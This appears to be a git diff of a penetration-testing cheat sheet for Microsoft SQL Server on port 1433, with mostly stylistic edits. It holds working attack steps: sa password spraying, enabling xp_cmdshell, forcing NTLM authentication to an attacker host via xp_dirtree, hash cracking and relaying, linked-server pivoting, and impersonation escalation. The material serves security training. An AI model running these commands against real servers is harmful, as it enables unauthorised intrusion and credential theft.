@@ -1,9 +1,9 @@
 ---
 title: MSSQL - Port 1433
-description: Enumeration and attack methodology for Microsoft SQL Server on port 1433, covering authentication modes, misconfigurations, data access, xp_cmdshell execution, NTLM hash capture, linked-server lateral movement, and in-engine privilege escalation.
+description: "Enumerate and attack Microsoft SQL Server on port 1433. Cover authentication modes, misconfigurations, data access, xp_cmdshell execution, NTLM hash capture, linked-server lateral movement, and in-engine privilege escalation."
 openGraph:
   title: "MSSQL - Port 1433"
-  description: "Enumeration and attack methodology for Microsoft SQL Server on port 1433, covering authentication modes, misconfigurations, data access, xp_cmdshell execution, NTLM hash capture, linked-server lateral movement, and in-engine privilege escalation."
+  description: "Enumerate and attack Microsoft SQL Server on port 1433. Cover authentication modes, misconfigurations, data access, xp_cmdshell execution, NTLM hash capture, linked-server lateral movement, and in-engine privilege escalation."
   images:
     - url: /imgs/mssql.jpg
       width: 1672
@@ -13,7 +13,7 @@ openGraph:
 twitter:
   card: summary_large_image
   title: "MSSQL - Port 1433"
-  description: "Enumeration and attack methodology for Microsoft SQL Server on port 1433, covering authentication modes, misconfigurations, data access, xp_cmdshell execution, NTLM hash capture, linked-server lateral movement, and in-engine privilege escalation."
+  description: "Enumerate and attack Microsoft SQL Server on port 1433. Cover authentication modes, misconfigurations, data access, xp_cmdshell execution, NTLM hash capture, linked-server lateral movement, and in-engine privilege escalation."
   images:
     - url: /imgs/mssql.jpg
       width: 1672
@@ -110,9 +110,9 @@ nmap -sU -p1434 <IP>
 nmap -Pn -sV -p2433 <IP>
 ```
 
-- [ ] `nmap -Pn -sV -sC -p1433 <IP>` detect SQL Server version, instance name, and default NSE output. MSSQL uses `1433/TCP` by default; a "hidden" instance moves to `2433/TCP`, and `1434/UDP` is the SQL Server Browser.
+- [ ] `nmap -Pn -sV -sC -p1433 <IP>` detect SQL Server version, instance name, and default NSE output. MSSQL uses `1433/TCP` by default. A "hidden" instance moves to `2433/TCP`, and `1434/UDP` is the SQL Server Browser.
 - [ ] `nmap --script ms-sql-info -p1433 <IP>` version, edition, patch level, and instance metadata.
-- [ ] `nmap --script ms-sql-ntlm-info -p1433 <IP>`extracts hostname, NetBIOS name, DNS domain, forest name, and OS build **without credentials**. MSSQL leaks NTLM challenge data to any anonymous connection, giving free domain intelligence before you touch auth. On an external engagement this is often the first proof you've landed in a domain-joined environment, and the DNS domain is exactly what you need to start Kerberos attacks after a foothold.
+- [ ] `nmap --script ms-sql-ntlm-info -p1433 <IP>` extracts hostname, NetBIOS name, DNS domain, forest name, and OS build **without credentials**. MSSQL leaks NTLM challenge data to any anonymous connection. That gives free domain intelligence before you touch auth. On an external engagement this is often the first proof you have landed in a domain-joined environment. The DNS domain is what you need to start Kerberos attacks after a foothold.
 - [ ] `nmap -sU -p1434 <IP>` SQL Server Browser enumerates named instances on non-default ports. Critical when `1433/TCP` looks closed but a named instance is running on a dynamic port.
 - [ ] Google `SQL Server <version> exploit` and run `searchsploit mssql`. Pre-2019 builds still appear in corporate networks and occasionally carry unpatched RCEs or auth bypasses.
 - [ ] Note the authentication mode from the banner and behavior (see *Authentication Mechanisms*). This decides whether you spray `sa`/local logins or domain credentials.
@@ -146,7 +146,7 @@ hydra -l sa -P /usr/share/wordlists/rockyou.txt <IP> mssql
 
 - [ ] `nxc mssql <IP> -u sa -p ''` empty `sa` password. A misconfigured auth setup (anonymous access, a user with no password, or "any user/group/machine" allowed) can let you in with no valid credential. Always try this first.
 - [ ] `nxc mssql <IP> -u sa -p 'sa'` / `'password'` / `'Password1'` / `'Password123'` lazy and policy-complying defaults.
-- [ ] `nmap --script ms-sql-empty-password -p1433 <IP>` nmap's equivalent empty-password check; useful as a second opinion.
+- [ ] `nmap --script ms-sql-empty-password -p1433 <IP>` nmap's equivalent empty-password check. Useful as a second opinion.
 - [ ] Try other common SQL logins with weak passwords: `admin`, `sql`, `mssql`, `dbadmin`, `sqlsvc`.
 - [ ] Spray every credential harvested from other services (web app configs, SMB shares, FTP, SNMP, other DB dumps). DBAs reuse passwords across the SQL estate more than any other population.
 - [ ] `nxc mssql <IP> -u <USER> -p '<PASS>' -d <DOMAIN>` Windows authentication. Domain users with only the `public` role are still enough to trigger NTLM-leak attacks (Phase 5) and enumerate linked servers (Phase 6). MSSQL does **not** share the domain controller's lockout semantics, so you can usually spray more aggressively here but keep it narrow on monitored instances.
@@ -193,7 +193,7 @@ Once you have a login, the immediate goal is to learn **who you are, what you ca
 - [ ] `SELECT @@version;` exact version and patch level.
 - [ ] `SELECT SYSTEM_USER;` the login you authenticated as (`SELECT USER_NAME();` for the current DB user, which differs under impersonation).
 - [ ] `SELECT IS_SRVROLEMEMBER('sysadmin');` the single most important check. `1` means you own the server: `xp_cmdshell`, linked-server abuse, hash capture, and file read/write are all unlocked.
-- [ ] `SELECT name FROM sys.databases;` (or `SELECT name FROM master.dbo.sysdatabases;`) list every database. System databases (`master`, `msdb`, `model`, `resource`, `tempdb`) hold engine metadata; the interesting data lives in the non-system databases.
+- [ ] `SELECT name FROM sys.databases;` (or `SELECT name FROM master.dbo.sysdatabases;`) list every database. System databases (`master`, `msdb`, `model`, `resource`, `tempdb`) hold engine metadata. The interesting data lives in the non-system databases.
 - [ ] `SELECT name FROM sys.server_principals WHERE type IN ('S','U','G');` list every SQL login, Windows user, and Windows group with access.
 - [ ] `SELECT * FROM sys.syslogins WHERE sysadmin = 1;` enumerate every sysadmin. If you're not one, check whether any of them are impersonable (Phase 7).
 - [ ] For each non-system database, enumerate and sweep:
@@ -202,7 +202,7 @@ Once you have a login, the immediate goal is to learn **who you are, what you ca
   - `SELECT column_name, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name LIKE '%pass%';` hunts password columns across the current database in one query.
 
 <Callout type="info">
-**Attack priority once you have sysadmin.** Do NTLM hash capture via `xp_dirtree` first (Phase 5) it is silent, needs no config change, and may hand you a domain credential. Only then reach for `xp_cmdshell` (Phase 4), which is loud and persistent. In parallel, check linked servers (Phase 6) for the classic lateral-movement pivot, and dump any application credentials you find for spraying elsewhere.
+**Attack priority once you have sysadmin.** Do NTLM hash capture via `xp_dirtree` first (Phase 5). It is silent, needs no config change, and may hand you a domain credential. Only then reach for `xp_cmdshell` (Phase 4), which is loud and persistent. In parallel, check linked servers (Phase 6) for the classic lateral-movement pivot. Dump any application credentials you find for spraying elsewhere.
 </Callout>
 
 ### Phase 4: Command Execution (xp_cmdshell)
@@ -232,7 +232,7 @@ EXEC xp_cmdshell 'whoami /all';
 EXEC xp_cmdshell 'whoami /priv';
 ```
 
-`xp_cmdshell` is an extended stored procedure that spawns `cmd.exe` under the SQL Server service account. It is disabled by default; when enabled, it turns any sysadmin session into an interactive OS foothold.
+`xp_cmdshell` is an extended stored procedure that spawns `cmd.exe` under the SQL Server service account. It is disabled by default. When enabled, it turns any sysadmin session into an interactive OS foothold.
 
 - [ ] Check if it's already on: `EXEC xp_cmdshell 'whoami';`. If it returns output, skip the enable step.
 - [ ] If disabled, enable it with the `sp_configure` sequence above (requires sysadmin).
@@ -244,7 +244,7 @@ EXEC xp_cmdshell 'whoami /priv';
 </Callout>
 
 <Callout type="info">
-**If `xp_cmdshell` is blocked** by audit policy, the same engine has quieter shell-equivalent primitives that mature policies often forget to constrain: **OLE Automation Procedures** (`sp_OACreate` + `WScript.Shell`, see *File Operations*), **CLR integration** (register a .NET assembly that calls `Process.Start`), and **SQL Agent jobs** (`sp_start_job` with a CMD/T-SQL step). `xp_dirtree` (Phase 5) also always remains for hash capture and relay.
+**If `xp_cmdshell` is blocked** by audit policy, the same engine has quieter shell-equivalent primitives that mature policies often forget to constrain. Those include **OLE Automation Procedures** (`sp_OACreate` + `WScript.Shell`, see *File Operations*), **CLR integration** (register a .NET assembly that calls `Process.Start`), and **SQL Agent jobs** (`sp_start_job` with a CMD/T-SQL step). `xp_dirtree` (Phase 5) also always remains for hash capture and relay.
 </Callout>
 
 ### Phase 5: NTLM Hash Capture
@@ -277,7 +277,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support
 ```
 
-`xp_dirtree`, `xp_subdirs`, and `xp_fileexist` use SMB to list a remote UNC path, which forces the SQL Server service account to authenticate to a server you control and hand over its NTLMv2 hash. This path needs no sysadmin a login with the `public` role can usually call these procedures — which makes it the highest-value primitive on many MSSQL targets.
+`xp_dirtree`, `xp_subdirs`, and `xp_fileexist` use SMB to list a remote UNC path. That forces the SQL Server service account to authenticate to a server you control and hand over its NTLMv2 hash. This path needs no sysadmin. A login with the `public` role can usually call these procedures. That makes it the highest-value primitive on many MSSQL targets.
 
 - [ ] Start a listener: `sudo responder -I <INTERFACE>` (cleanest capture) or `impacket-smbserver share $(pwd) -smb2support`.
 - [ ] Force the auth with `xp_dirtree`/`xp_subdirs`/`xp_fileexist` pointed at `\\<LHOST>\share\`. (`xp_subdirs` may error with "Access is denied" and still complete the authentication the hash is captured regardless.)
@@ -286,7 +286,7 @@ impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support
 - [ ] If cracking fails, **relay** instead: `impacket-ntlmrelayx -t smb://<TARGET_IP> -smb2support`, then trigger `xp_dirtree` again. If any target lacks SMB signing, you get code execution as the SQL service account there without cracking anything.
 
 <Callout type="info">
-If the SQL service account is a domain user (common for instances that reach file shares or linked servers), the captured hash is a **domain credential** sprayable, Kerberoastable if it has an SPN, and usable for BloodHound path queries. A single `xp_dirtree` capture has been the entire pivot into Active Directory on many CPTS-style networks.
+If the SQL service account is a domain user (common for instances that reach file shares or linked servers), the captured hash is a **domain credential**. It is sprayable, Kerberoastable if it has an SPN, and usable for BloodHound path queries. A single `xp_dirtree` capture has been the entire pivot into Active Directory on many CPTS-style networks.
 </Callout>
 
 ### Phase 6: Linked Servers (Lateral Movement)
@@ -316,7 +316,7 @@ EXECUTE('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
 
 Linked servers let one SQL Server run queries against another instance (or another product such as Oracle). They store credentials, or delegate the current login, so queries cross the boundary transparently. If the link authenticates with a sysadmin account on the remote server, you inherit that privilege even when your local login is only `public`.
 
-- [ ] `SELECT srvname, isremote FROM sysservers;` list every server the instance knows. `isremote = 0` marks a linked server (the interesting target); `1` is a remote server.
+- [ ] `SELECT srvname, isremote FROM sysservers;` list every server the instance knows. `isremote = 0` marks a linked server (the interesting target). `1` is a remote server.
 - [ ] `SELECT * FROM sys.servers;` / `EXEC sp_linkedservers;` richer metadata, including the data source and whether RPC out is enabled.
 - [ ] Test the identity you land as on the far side with either `openquery(...)` or `EXECUTE(...) AT [...]`. If `is_srvrolemember('sysadmin')` returns `1`, you already have sysadmin on the remote box the link handed you the context, no remote credential required.
 - [ ] Execute commands across a link with RPC out (escape single quotes by doubling them, separate multiple statements with `;`):
@@ -326,7 +326,7 @@ Linked servers let one SQL Server run queries against another instance (or anoth
   EXECUTE('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
   ```
 - [ ] Chain links: if ServerA → ServerB → ServerC, pivot across all three with nested `EXECUTE (...) AT`. Enterprise networks routinely have multi-hop chains bridging DMZ, internal, and production zones.
-- [ ] Check for a bi-directional loop (ServerA → ServerB → ServerA with escalated context) that can hand you sysadmin on your original box even if you started without it.
+- [ ] Check for a bi-directional loop (ServerA → ServerB → ServerA with escalated context). That loop can hand you sysadmin on your original box even if you started without it.
 
 ### Phase 7: Privilege Escalation within MSSQL
 
@@ -358,13 +358,13 @@ REVERT;
 SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;
 ```
 
-If you land as a low-privilege login, several misconfigurations still escalate you to sysadmin without leaving the database. Sysadmins can impersonate anyone by default; for non-admins the `IMPERSONATE` right must be explicitly granted  and it frequently is, for automation reasons.
+If you land as a low-privilege login, several misconfigurations still escalate you to sysadmin without leaving the database. Sysadmins can impersonate anyone by default. For non-admins the `IMPERSONATE` right must be explicitly granted  and it frequently is, for automation reasons.
 
 - [ ] Confirm your role with `SELECT IS_SRVROLEMEMBER('sysadmin');` (`0` = not sysadmin yet).
 - [ ] Enumerate impersonable logins with the `IMPERSONATE` query above. Any login you can `EXECUTE AS` is a privilege gift.
 - [ ] Impersonate and verify: `EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');` `1` means you now act as sysadmin. Use `REVERT;` to drop back.
 - [ ] **TRUSTWORTHY abuse:** a database marked `TRUSTWORTHY = ON` runs its stored procedures as the login that created them. If that login is sysadmin and you are `db_owner`, create a procedure that executes with sysadmin context. One of the most common real-world MSSQL privesc paths.
-- [ ] **Stored-procedure injection:** look for user-written procedures that concatenate input into dynamic SQL; classic SQLi inside MSSQL extends your context.
+- [ ] **Stored-procedure injection:** look for user-written procedures that concatenate input into dynamic SQL. Classic SQLi inside MSSQL extends your context.
 - [ ] **PowerUpSQL:** `Invoke-SQLAudit -Instance <IP>` sweeps for every known escalation path (TRUSTWORTHY, impersonation, weak roles, agent jobs, writable procedures) in one pass.
 
 <Callout type="important">
@@ -380,12 +380,12 @@ If you land as a low-privilege login, several misconfigurations still escalate y
     "Brute force the sa account on PROD_DB using the link"
   ]}
   answer={2}
-  explanation="Enabling xp_cmdshell requires sysadmin, which you don't have on the current instance option A fails immediately. Option B is valid and you should do it eventually, but it may return a local service account hash that won't help if the target is sandboxed. Option D is nonsense: links don't give you an auth oracle. Option C is the critical move linked servers frequently authenticate with stored sysadmin credentials, and a single query tells you whether you've just inherited full control of PROD_DB without any further escalation. If IS_SRVROLEMEMBER returns 1 on the remote server, you've completed the entire privilege escalation step in one query, then run commands through the link via EXECUTE (...) AT [PROD_DB]. This is the CPTS-classic MSSQL pivot and it fails silently if you don't check."
+  explanation="Enabling xp_cmdshell requires sysadmin, which you do not have on the current instance. Option A fails immediately. Option B is valid and you should do it eventually, but it may return a local service account hash that will not help if the target is sandboxed. Option D is nonsense: links do not give you an auth oracle. Option C is the critical move. Linked servers frequently authenticate with stored sysadmin credentials. A single query tells you whether you have just inherited full control of PROD_DB without any further escalation. If IS_SRVROLEMEMBER returns 1 on the remote server, you have completed the entire privilege escalation step in one query. Then run commands through the link via EXECUTE (...) AT [PROD_DB]. This is the CPTS-classic MSSQL pivot and it fails silently if you do not check."
 />
 
 ## Overview
 
-MSSQL is Microsoft's flagship relational database server, deeply integrated with Windows and Active Directory. It's ubiquitous in Microsoft-heavy enterprises and appears on virtually every CPTS-style internal engagement. That tight Windows integration is also its weakness SQL logins share the NT auth subsystem, service accounts are often domain users, and the engine exposes primitives (`xp_cmdshell`, `xp_dirtree`, linked servers) that bridge database access into OS and domain compromise.
+MSSQL is Microsoft's flagship relational database server, deeply integrated with Windows and Active Directory. It is ubiquitous in Microsoft-heavy enterprises and appears on virtually every CPTS-style internal engagement. That tight Windows integration is also its weakness. SQL logins share the NT auth subsystem. Service accounts are often domain users. The engine exposes primitives (`xp_cmdshell`, `xp_dirtree`, linked servers) that bridge database access into OS and domain compromise.
 
 | Detail | Value |
 |--------|-------|
@@ -399,18 +399,18 @@ MSSQL is Microsoft's flagship relational database server, deeply integrated with
 
 ## Authentication Mechanisms
 
-MSSQL supports two authentication modes; users can therefore be created in Windows/AD or inside SQL Server itself.
+MSSQL supports two authentication modes. Users can therefore be created in Windows/AD or inside SQL Server itself.
 
 | Mode | Description |
 |------|-------------|
-| Windows authentication (default) | Often called "integrated security." The SQL security model is tied to Windows/AD; specific Windows users and groups are trusted to log in, and already-authenticated Windows users present no extra credentials. |
+| Windows authentication (default) | Often called "integrated security." The SQL security model is tied to Windows/AD. Specific Windows users and groups are trusted to log in, and already-authenticated Windows users present no extra credentials. |
 | Mixed mode | Accepts both Windows/AD accounts and SQL Server logins. Username/password pairs are maintained inside SQL Server. |
 
-When authenticating with a client, specifying a domain or hostname selects **Windows Authentication**; omitting it makes the client assume **SQL Authentication** against logins created in SQL Server. To target a local Windows account use `SERVERNAME\accountname` or `.\accountname` (e.g. `sqsh -S <IP> -U .\\<USER> -P '<PASS>' -h`).
+When authenticating with a client, specifying a domain or hostname selects **Windows Authentication**. Omitting it makes the client assume **SQL Authentication** against logins created in SQL Server. To target a local Windows account use `SERVERNAME\accountname` or `.\accountname` (e.g. `sqsh -S <IP> -U .\\<USER> -P '<PASS>' -h`).
 
 ### Misconfigurations
 
-Misconfigured authentication can grant access with no valid credential when: anonymous access is enabled, a user is configured with no password, or any user/group/machine is allowed to reach the SQL Server. These are exactly what the empty/default-credential checks in Phase 2 exploit.
+Misconfigured authentication can grant access with no valid credential when anonymous access is enabled, a user is configured with no password, or any user/group/machine is allowed to reach the SQL Server. These are exactly what the empty/default-credential checks in Phase 2 exploit.
 
 ### Privileges
 
@@ -435,11 +435,11 @@ System databases hold engine metadata and rarely contain company data, but they 
 | `msdb` | Used by SQL Server Agent (jobs, alerts, backup/restore history) |
 | `model` | Template copied for each new database |
 | `resource` | Read-only DB holding system objects, surfaced in the `sys` schema of every database |
-| `tempdb` | Temporary objects for SQL queries; recreated on service restart |
+| `tempdb` | Temporary objects for SQL queries. Recreated on service restart |
 
 ## SQL Syntax Reference
 
-Native clients need `GO` to submit a batch; `impacket-mssqlclient` executes on Enter.
+Native clients need `GO` to submit a batch. `impacket-mssqlclient` executes on Enter.
 
 ```sql
 -- Show databases
@@ -520,7 +520,7 @@ nxc mssql <IP> -u sa -p '<PASS>' -X "Get-Process"   # PowerShell via -X
 nxc mssql <SUBNET>/24 -u sa -p '<PASS>'
 ```
 
-The subnet sweep is the hidden weapon of `nxc mssql`. Once you crack a single SQL login, spraying it across a `/24` routinely reveals other instances sharing the same password common wherever DBAs reuse one "SQL admin" account across dev, staging, and production.
+The subnet sweep is the hidden weapon of `nxc mssql`. Once you crack a single SQL login, spraying it across a `/24` routinely reveals other instances sharing the same password. That is common wherever DBAs reuse one "SQL admin" account across dev, staging, and production.
 
 
 Useful built-in shell commands:
